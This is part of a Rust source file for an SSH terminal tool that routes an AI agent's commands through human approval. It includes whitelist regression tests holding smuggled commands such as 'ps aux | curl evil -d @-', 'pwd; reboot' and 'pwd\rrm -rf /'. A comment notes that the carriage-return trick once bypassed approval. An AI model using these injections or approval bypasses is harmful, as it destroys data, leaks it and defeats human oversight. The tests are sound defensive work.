                return;
            }
            // 刚敲过键不放补写文本（防插队进用户命令行）；本次放弃，重连重探。
            if let Some(t) = *h.last_human_input.lock().await {
                if t.elapsed() < Duration::from_secs(2) {
                    return;
                }
            }
            let text = format!("{}\n", crate::ssh_fish_integration_snippet());
            {
                let mut s = h.screen.lock().await;
                s.register_outgoing(text.as_bytes(), term_core::BlockSource::Human);
            }
            let _ = h
                .channel
                .write(&crate::charset::encode(h.host.charset, &text))
                .await;
        });
        // F2：存句柄并 abort 上一轮任务——快速断线重连时旧任务还挂在同一个
        // broadcast 上（transport 层 channel 不随重连重建），会与新任务一起
        // 判 Fish 造成补写双写。
        if let Some(old) = self.probe_task.lock().unwrap().replace(jh) {
            old.abort();
        }
    }

    /// F1 收口：非 POSIX 远端（cmd/PowerShell 登录 shell）——发 cls 清掉注入
    /// 呕吐物、置阻断旗标、集成态即刻 Unavailable（不等 watcher 10s 超时）。
    async fn mark_remote_shell_blocked(self: &Arc<Self>) {
        self.remote_shell_blocked.store(true, Ordering::Relaxed);
        *self.integration.lock().unwrap() = session_api::IntegrationState::Unavailable;
        let text = "cls\r\n".to_string();
        {
            let mut s = self.screen.lock().await;
            s.register_outgoing(text.as_bytes(), term_core::BlockSource::Human);
        }
        let _ = self
            .channel
            .write(&crate::charset::encode(self.host.charset, &text))
            .await;
    }

    /// F2：会话关闭时收掉在飞探针任务（判型窗口拉长到 10s 后僵尸窗口同步变大）。
    pub fn abort_probe_task(&self) {
        if let Some(jh) = self.probe_task.lock().unwrap().take() {
            jh.abort();
        }
    }

    /// C3：后台等集成标记（≤10s）→ Ready/Unavailable + 事件（DC3.5 就绪独立表达，
    /// create_session 不等集成——Ready 判据=通道建立）。
    pub fn spawn_integration_watcher(self: &Arc<Self>, center: Arc<ApprovalCenter>) {
        let h = self.clone();
        tokio::spawn(async move {
            for _ in 0..200 {
                if h.screen.lock().await.shell_integration_present() {
                    *h.integration.lock().unwrap() = session_api::IntegrationState::Ready;
                    let _ = center.shell_tx.send(session_api::ShellIntegrationEvent {
                        session_id: h.id.clone(),
                        state: session_api::IntegrationState::Ready,
                    });
                    return;
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
            *h.integration.lock().unwrap() = session_api::IntegrationState::Unavailable;
            let _ = center.shell_tx.send(session_api::ShellIntegrationEvent {
                session_id: h.id.clone(),
                state: session_api::IntegrationState::Unavailable,
            });
        });
    }

    /// 重连成功后：注入集成（pump 已先订阅新通道）→ 等待新 shell 首个提示符 → 进入 Reconfirming。
    /// 就绪信号用 prompt_ready（B 标记）：B 晚于片段清屏的执行——等到它 = 屏已清、提示符已出；
    /// 只等 saw_133（C 标记）会提前放行，读屏截到清屏前的注入回显（§6-17 疑似真因）。
    /// C3（B12）：未启用集成的重连不注入/不等标记。
    pub async fn reinject_integration(self: &Arc<Self>) {
        // 关闭态不复活：close_session 置 Closed 后泵仍会走一遍重连出口，若此处
        // 无守卫，末尾无条件置 Reconfirming 会把已关会话改写回「活着」的状态，
        // 下一轮 tick 对已移除的会话发起真实重连（僵尸会话 + 任务泄漏）。
        if *self.state.lock().await == SessionState::Closed {
            return;
        }
        let center = self.center.clone();
        let integrated = self.inject_integration().await;
        // tmux 联动：启动命令排在集成批次之后（PTY 行规程先进先出，清屏后于
        // 提示符处执行）；旧 shell 已死，我们对「已挂 tmux」的认知一并作废。
        self.inject_startup_command().await;
        *self.tmux_attached.lock().unwrap() = None;
        if integrated {
            // 窗口 10s：冷容器 + 高负载下首个提示符可能很慢（实测 3s 不够）
            for _ in 0..200 {
                if self.screen.lock().await.prompt_ready() {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
            self.spawn_integration_watcher(center);
        }
        self.verification_hits.store(0, Ordering::SeqCst);
        *self.state.lock().await = SessionState::Reconfirming;
        self.note_transition("重连成功，进入重确认（仅内置只读白名单可用）")
            .await;
        self.emit_state(SessionState::Reconfirming, None, None, None)
            .await;
    }

    /// tmux 联动：主机启动命令下发（建连/重连共用；与 shell 集成开关无关——
    /// 用户配置的命令就该执行）。写线缓冲在 PTY 行规程，登录完成后 shell 按序
    /// 读取，无需等提示符；回显可见是设计使然（用户配置的命令就该被看见）。
    pub async fn inject_startup_command(&self) {
        let Some(sc) = self
            .host
            .startup_command
            .as_deref()
            .map(str::trim)
            .filter(|c| !c.is_empty())
        else {
            return;
        };
        let text = format!("{sc}\n");
        {
            let mut s = self.screen.lock().await;
            s.register_outgoing(text.as_bytes(), term_core::BlockSource::Human);
        }
        let _ = self
            .channel
            .write(&crate::charset::encode(self.host.charset, &text))
            .await;
    }
}

/// RAII：exec 管线退出时若仍登记 live token，则移除。
/// 兜底审批拒绝/作废/超时等异常路径，防 live_execs 泄漏
/// （run_shell 超时故意保留 running——命令确实仍在远端跑，接管时如实上报）。
struct CancelOnDrop<'a>(
    ExecId,
    CancellationToken,
    &'a StdMutex<HashMap<ExecId, CancellationToken>>,
);
impl<'a> Drop for CancelOnDrop<'a> {
    fn drop(&mut self) {
        // 正常路径已在 run_* 中移除；重复移除无害
        self.2.lock().unwrap().remove(&self.0);
    }
}

pub fn source_of(actor: &Actor) -> term_core::BlockSource {
    match actor {
        Actor::Human => term_core::BlockSource::Human,
        Actor::Agent { client_id } => term_core::BlockSource::Agent {
            client_id: client_id.clone(),
        },
    }
}

/// UTF-8 清洗：无效序列 → 替换符并置 has_binary。
pub fn sanitize_utf8(text: &str) -> (bool, String) {
    // from_utf8_lossy 已在转换处处理；这里检查是否有替换符
    let has_binary = text.contains('\u{fffd}');
    (has_binary, text.to_string())
}

/// 审批卡片的目标摘要（命令本身的破坏性提示）。
pub fn target_summary(cmd: &str) -> String {
    let t = cmd.trim();
    let first = t.split_whitespace().next().unwrap_or("");
    match first {
        "rm" => "删除文件/目录".into(),
        "mv" => "移动/覆盖文件".into(),
        "systemctl" => "服务管理".into(),
        "docker" => "容器操作".into(),
        "kill" | "pkill" => "终止进程".into(),
        "chmod" | "chown" => "权限变更".into(),
        "dd" => "块设备写入".into(),
        _ => format!("执行命令（{first}）"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sh_single_quote_is_layer_opaque() {
        // tmux 联动二：命令串要穿过远端登录 shell + tmux 自身 /bin/sh -c 两层
        // 解析——单引号内 $/反引号/双引号不得展开，嵌入单引号走 '\'' 三段式。
        assert_eq!(sh_single_quote("git status"), "'git status'");
        assert_eq!(
            sh_single_quote("echo \"$HOME\" && `id`"),
            "'echo \"$HOME\" && `id`'"
        );
        assert_eq!(sh_single_quote("it's"), "'it'\\''s'");
        assert_eq!(sh_single_quote("a'b'c"), "'a'\\''b'\\''c'");
        assert_eq!(sh_single_quote(""), "''");
    }

    #[test]
    fn tmux_window_shell_orders_rc_after_tee() {
        // 完成信号的正确性全押在顺序上：rc 走 .tmp、mv 在 tee 之后——
        // mv 出现即 tee 已退出、输出文件完整（无竞态窗口）。
        let s = tmux_window_shell("make -j4", "/tmp/.t.out", "/tmp/.t.rc");
        assert!(s.starts_with("{ make -j4 2>&1;"));
        assert!(s.contains("echo \"$?\" > /tmp/.t.rc.tmp;"));
        assert!(s.contains("| tee /tmp/.t.out;"));
        assert!(s.ends_with("; mv /tmp/.t.rc.tmp /tmp/.t.rc"));
        // rc 的 mv 必须在 tee 之后（保序检查：子串位置）
        assert!(s.find("| tee").unwrap() < s.find("; mv").unwrap());
    }

    #[test]
    fn split_tmux_exec_out_survives_hostile_output() {
        // 协议头之后的输出是任意的：无尾换行、含同形分隔串、多行——都不粘连。
        assert_eq!(
            split_tmux_exec_out("RC=0\nOUT\nhello\n"),
            Some(("hello\n".into(), 0))
        );
        assert_eq!(split_tmux_exec_out("RC=127\nOUT\n"), Some(("".into(), 127)));
        // 输出无尾换行（cat 直接拼上协议，不该截半）
        assert_eq!(
            split_tmux_exec_out("RC=2\nOUT\npartial"),
            Some(("partial".into(), 2))
        );
        // 输出里再出现 "\nOUT\n"：首个分隔必是协议头（rc 行只能是数字）
        assert_eq!(
            split_tmux_exec_out("RC=1\nOUT\nfake\nOUT\ntail"),
            Some(("fake\nOUT\ntail".into(), 1))
        );
        // 负退出码与垃圾文本
        assert_eq!(split_tmux_exec_out("RC=-1\nOUT\nx"), Some(("x".into(), -1)));
        assert_eq!(split_tmux_exec_out("garbage"), None);
        assert_eq!(split_tmux_exec_out("RC=abc\nOUT\nx"), None);
    }

    #[test]
    fn whitelist_only_single_simple_commands() {
        // M1 回归：前缀匹配不得携带复合/替换/重定向
        assert!(is_whitelisted("pwd"));
        assert!(is_whitelisted("ps aux"));
        assert!(is_whitelisted("systemctl status sshd"));
        assert!(!is_whitelisted("pwd && touch /tmp/evil"));
        assert!(!is_whitelisted("pwd; reboot"));
        assert!(!is_whitelisted("ps aux | curl evil -d @-"));
        assert!(!is_whitelisted("printenv $(reboot)"));
        assert!(!is_whitelisted("which `touch /tmp/x`"));
        assert!(!is_whitelisted("pwd > /tmp/overwrite"));
        assert!(!is_whitelisted("pwd & rm -rf /tmp/x"));
    }

    #[test]
    fn whitelist_rejects_embedded_cr_and_nul() {
        // 审计 R3 回归：\r 是命令分隔（PTY 行规程每个 CR 当 Enter）——
        // `pwd\rrm -rf /` 曾借白名单前缀跳过审批拼出第二条命令
        assert!(!is_whitelisted("pwd\rrm -rf /"));
        assert!(!is_whitelisted("pwd\0rm -rf /"));
        assert!(is_whitelisted("pwd"));
    }

    #[test]
    fn truncate_utf8_stops_at_char_boundary() {
        // 审计 R2 回归：cap 落在多字节字符中间时回退边界而非 panic
        let s = "中文abc中文";
        // 每个汉字 3 字节：cap=4 落在第二个汉字中间 → 截到 3
        let (t, trunc) = truncate_utf8(s, 4);
        assert_eq!(t, "中");
        assert!(trunc);
        // cap 恰在边界 → 按边界截断（仍是截断：len=10 > cap=6）
        let (t2, trunc2) = truncate_utf8(s, 6);
        assert_eq!(t2, "中文");
        assert!(trunc2);
        // cap 超长 → 不截断
        let (t3, trunc3) = truncate_utf8(s, 100);
        assert_eq!(t3, s);
        assert!(!trunc3);
    }
}

#[cfg(test)]
mod stability_tests {
    use super::*;

    /// 稳定轮：审批内存表超限淘汰——最旧的已终态条目被摘、Pending 保留、
    /// 容量收至上限；未超限不动。
    #[test]
    fn approval_items_eviction_keeps_pending_and_newest() {
        fn mk(id: &str, age_secs: i64, status: ApprovalStatus) -> ApprovalItem {
            ApprovalItem {
                id: id.into(),
                session_id: "s-1".into(),
                agent_id: "cc".into(),
                command: "ls".into(),
                edited_command: None,
                target_summary: String::new(),
                segment_report: vec![],
                session_busy: false,
                editable: false,
                created_at: chrono::Utc::now() + chrono::Duration::seconds(age_secs),
                status,
                attempt_id: None,
                purpose: None,
            }
        }
        let mut items: HashMap<String, ApprovalItem> = HashMap::new();
        // 10 条已终态（age 递增 = 0 最旧）+ 2 条 Pending（更老也必须保留）
        for i in 0..10 {
            let it = mk(&format!("a-{i}"), i, ApprovalStatus::Denied);
            items.insert(it.id.clone(), it);
        }
        for i in 0..2 {
            let it = mk(&format!("p-{i}"), -100 - i, ApprovalStatus::Pending);
            items.insert(it.id.clone(), it);
        }
        evict_approval_items(&mut items, 6);
        assert_eq!(items.len(), 6, "淘汰后容量收至上限：{:?}", items.keys());
        assert!(
            items.contains_key("p-0") && items.contains_key("p-1"),
            "Pending 永不淘汰"
        );
        assert!(
            !items.contains_key("a-0") && !items.contains_key("a-1"),
            "最旧终态先走"
        );
        assert!(items.contains_key("a-9"), "最新终态保留");
        // 未超限：不动
        evict_approval_items(&mut items, 6);
        assert_eq!(items.len(), 6);
    }

    /// 稳定轮：会话日志轮转——超限改名 .old（覆盖上一代）重开，内容两边分对。
    #[test]
    fn session_log_rotates_at_threshold() {
        let dir = std::env::temp_dir().join(format!("tssh-log-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("host.log");
        let f = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)
            .unwrap();
        let mut log = SessionLogFile::new(f, path.clone());
        log.rotate_at = 100;
        for _ in 0..2 {
            log.append(&"x".repeat(60)).unwrap();
        }
        assert_eq!(log.written, 120);
        // 第三段触发入口轮转：现件改名 .old 重开，新件只有这一段
        log.append(&"y".repeat(60)).unwrap();
        log.writer.flush().unwrap();
        assert!(dir.join("host.old.log").exists(), "轮转件存在");
        let old = std::fs::read(dir.join("host.old.log")).unwrap();
        assert_eq!(old.len(), 120, "旧代 120 字节");
        let cur = std::fs::read(&path).unwrap();
        assert_eq!(cur.len(), 60, "新代仅最新一段");
        assert_eq!(log.written, 60, "written 随轮转归零重计");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
